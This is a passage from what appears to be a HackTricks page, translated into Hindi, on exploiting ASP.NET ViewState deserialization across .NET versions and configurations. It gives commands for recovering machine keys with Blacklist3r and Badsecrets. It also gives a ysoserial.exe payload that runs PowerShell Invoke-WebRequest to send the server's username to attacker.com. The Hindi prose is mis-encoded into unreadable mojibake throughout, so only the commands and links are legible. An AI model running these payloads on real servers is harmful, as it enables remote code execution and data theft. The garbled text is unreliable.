рдЬрдм рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ `_VIEWSTATEGENERATOR` рдкреИрд░рд╛рдореАрдЯрд░ рдирд╣реАрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЖрдкрдХреЛ `--generator` рдкреИрд░рд╛рдореАрдЯрд░ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд╛рд╣рд┐рдП:
```bash
--apppath="/" --path="/hello.aspx"
```
### рдкрд░реАрдХреНрд╖рдг рдорд╛рдорд▓рд╛: 3 тАУ .Net < 4.5 рдФрд░ EnableViewStateMac=true/false рдФрд░ ViewStateEncryptionMode=true

рдЗрд╕рдореЗрдВ рдпрд╣ рдирд╣реАрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рдХрд┐ рдкреИрд░рд╛рдореАрдЯрд░ MAC рдХреЗ рд╕рд╛рде рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ рдпрд╛ рдирд╣реАрдВред рдлрд┐рд░, рдорд╛рдиреНрдпрддрд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдкреЗрд▓реЛрдб рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдорд╢реАрди рдХреБрдВрдЬреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА**ред

**рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **рдореЙрдбреНрдпреВрд▓ рд╡рд┐рдХрд╛рд╕ рдХреЗ рдЕрдзреАрди рд╣реИ...**

**.NET 4.5 рд╕реЗ рдкрд╣рд▓реЗ**, ASP.NET **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рд╕реЗ** рдПрдХ **рдЕрдирдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб** \_`__VIEWSTATE`\_рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **рд╕реНрд╡реАрдХрд╛рд░** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, **рднрд▓реЗ рд╣реА** **`ViewStateEncryptionMode`** рдХреЛ _**рд╣рдореЗрд╢рд╛**_ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред ASP.NET **рдХреЗрд╡рд▓** рдЕрдиреБрд░реЛрдз рдореЗрдВ **`__VIEWSTATEENCRYPTED`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреА **рдЙрдкрд╕реНрдерд┐рддрд┐** рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИред **рдпрджрд┐ рдХреЛрдИ рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ, рдФрд░ рдЕрдирдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдкреЗрд▓реЛрдб рднреЗрдЬрддрд╛ рд╣реИ, рддреЛ рдлрд┐рд░ рднреА рдЗрд╕реЗ рдкреНрд░реЛрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред**

рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рд╣рдорд▓рд╛рд╡рд╛рд░ рдПрдХ рддрд░реАрдХрд╛ рдвреВрдВрдврд╝ рд▓реЗрддреЗ рд╣реИрдВ рдорд╢реАрди рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реЗ рджреЛрд╖ рдЬреИрд╕реЗ рдлрд╝рд╛рдЗрд▓ рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) рдорд╛рдорд▓рд╛ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрдорд╛рдВрдб, ViewState рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рджреЛрд╖ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

* ViewState рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рджреЛрд╖ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рд╕реЗ `__VIEWSTATEENCRYPTED` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╣рдЯрд╛рдПрдВ, рдЕрдиреНрдпрдерд╛ рдПрдХ Viewstate MAC рдорд╛рдиреНрдпрддрд╛ рддреНрд░реБрдЯрд┐ рд▓реМрдЯрд╛рдПрдЧрд╛ рдФрд░ рджреЛрд╖ рдХрд╛ рд╢реЛрд╖рдг рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

### рдкрд░реАрдХреНрд╖рдг рдорд╛рдорд▓рд╛: 4 тАУ .Net >= 4.5 рдФрд░ EnableViewStateMac=true/false рдФрд░ ViewStateEncryptionMode=true/false рдХреЗрд╡рд▓ рджреЛрдиреЛрдВ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдирдХрд╛рд░реЗрдВ

рд╣рдо ASP.NET рдлреНрд░реЗрдорд╡рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЛ рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдиреАрдЪреЗ рджрд┐рдЦрд╛рдП рдЧрдП рд╡реЗрдм.config рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗред
```xml
<httpRuntime targetFramework="4.5" />
```
рдЗрд╕рдХреЗ рд╡рд┐рдХрд▓реНрдк рдХреЗ рд░реВрдк рдореЗрдВ, рдпрд╣ рд╡реЗрдм.рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдХреЗ `machineKey` рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд╡рд┐рдХрд▓реНрдк рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
compatibilityMode="Framework45"
```
рдЬреИрд╕рд╛ рдкрд┐рдЫрд▓реЗ рдореЗрдВ **рдорд╛рди рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╣реИред** рдЗрд╕рдХреЗ рдмрд╛рдж, **рдПрдХ рд╡реИрдз рдкреЗрд▓реЛрдб рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХреБрдВрдЬреА рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред**

рдЖрдк [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рдХреБрдВрдЬреА рдЦреЛрдЬрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
[рдпрд╣рд╛рдБ рд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП IISDirPath рдФрд░ TargetPagePath рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдЦреЗрдВ](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

рдпрд╛, [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (рдЬреЗрдирд░реЗрдЯрд░ рдорд╛рди рдХреЗ рд╕рд╛рде):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

рдПрдХ рд╡реИрдз рдорд╢реАрди рдХреБрдВрдЬреА рдХреА рдкрд╣рдЪрд╛рди рд╣реЛрдиреЗ рдкрд░, **рдЕрдЧрд▓рд╛ рдХрджрдо рд╣реИ** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕реАрд░реАрдХреГрдд рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛**
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ `__VIEWSTATEGENERATOR` рдХрд╛ рдорд╛рди рд╣реИ рддреЛ рдЖрдк рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **--generator** рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрд╕ рдорд╛рди рдХреЗ рд╕рд╛рде рдХрд░рдХреЗ рдФрд░ **--path** рдФрд░ **--apppath** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **рдЫреЛрдбрд╝** рд╕рдХрддреЗ рд╣реИрдВред

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

ViewState рдбреАрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдХрд╛ рд╕рдлрд▓ рд╢реЛрд╖рдг рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕рд░реНрд╡рд░ рдХреЛ рдмрд╛рд╣рд░реА рдЕрдиреБрд░реЛрдз рдореЗрдВ рд▓реЗ рдЬрд╛рдПрдЧрд╛, рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╢рд╛рдорд┐рд▓ рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╢реЛрд╖рдг рдПрдХ рдкреНрд░рдорд╛рдг рдХрд╛ рд╕рд┐рджреНрдзрд╛рдВрдд (PoC) рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET" рд╢реАрд░реНрд╖рдХ рд╕рдВрд╕рд╛рдзрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╢реЛрд╖рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛рдо рдХреИрд╕реЗ рдХрд░рддреА рд╣реИ рдФрд░ MachineKey рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП Blacklist3r рдЬреИрд╕реЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдЖрдк [PoC of Successful Exploitation](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC) рдХреЛ рд╕рдореАрдХреНрд╖рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдкрд░реАрдХреНрд╖рдг рдорд╛рдорд▓рд╛ 6 тАУ ViewStateUserKeys рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ

**ViewStateUserKey** рдЧреБрдгрд╡рддреНрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ **CSRF рд╣рдорд▓реЗ** рдХреЗ рдЦрд┐рд▓рд╛рдл **рд░рдХреНрд╖рд╛** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдРрд╕реА рдПрдХ рдХреБрдВрдЬреА рдХреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╣рдо рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рд╣рдо рдЙрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ **ViewState** рдкреЗрд▓реЛрдб рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ рдЬрд┐рд╕реЗ рдЕрдм рддрдХ рдЪрд░реНрдЪрд┐рдд рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде, рддреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рджреНрд╡рд╛рд░рд╛ **рдкреЗрд▓реЛрдб рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред\
рдЖрдкрдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдкреЗрд▓реЛрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### рд╕рдлрд▓ рд╢реЛрд╖рдг рдХреЗ рдкрд░рд┐рдгрд╛рдо <a href="#poc" id="poc"></a>

рд╕рднреА рдкрд░реАрдХреНрд╖рдг рдорд╛рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП, рдпрджрд┐ ViewState YSoSerial.Net payload **рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ** рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рддреЛ рд╕рд░реНрд╡рд░ тАЬ**500 рдЖрдВрддрд░рд┐рдХ рд╕рд░реНрд╡рд░ рддреНрд░реБрдЯрд┐**тАЭ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕рд╛рдордЧреНрд░реА тАЬ**рдЗрд╕ рдкреГрд╖реНрда рдХреЗ рд▓рд┐рдП рд░рд╛рдЬреНрдп рд╕реВрдЪрдирд╛ рдЕрдорд╛рдиреНрдп рд╣реИ рдФрд░ рдпрд╣ рднреНрд░рд╖реНрдЯ рд╣реЛ рд╕рдХрддреА рд╣реИ**тАЭ рд╣реЛрддреА рд╣реИ рдФрд░ рд╣рдо OOB рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред

рдФрд░ [рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдБ рджреЗрдЦреЗрдВ](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)

## рд╕рдВрджрд░реНрдн

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ **Intigriti** рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдЖрдЬ рд╣реА, рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рддрдХ **$100,000** рддрдХ!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com)
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
